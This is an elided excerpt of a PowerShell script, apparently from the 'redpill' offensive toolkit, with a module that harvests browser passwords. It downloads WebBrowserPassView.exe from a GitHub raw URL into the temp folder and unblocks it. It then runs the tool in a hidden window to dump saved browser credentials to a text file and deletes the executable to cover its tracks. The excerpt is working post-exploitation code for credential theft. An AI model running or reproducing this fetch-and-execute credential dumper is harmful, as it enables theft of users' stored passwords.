...
If($ManyCats.IsPresent)
{
   ...
   If($Module -iMatch '^(browser)$')
   {
      ...
      write-host "  - " -ForegroundColor Yellow -NoNewline
      write-host "Downloading WebBrowserPassView to %TMP%"

      ## WebBrowserPassView execution
      write-host "  - " -ForegroundColor Yellow -NoNewline
      write-host "Invoking " -NoNewline
      write-host "WebBrowserPassView" -ForegroundColor DarkYellow -NoNewline
      write-host " /stext`n"
   }
   Else
   {
   ...
   Else
   {
      ...
      ElseIf($Module -iMatch '^(browser)$')
      {
         ...
         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/WebBrowserPassView.exe" -OutFile "$Env:TMP\WebBrowserPassView.exe"|Unblock-File
         Start-Process -WindowStyle Hidden powershell -ArgumentList ".\WebBrowserPassView.exe /stext webbrowser.txt" -Wait
   ...
   Remove-Item -Path "${Env:TMP}\WebBrowserPassView.exe" -Force 
}
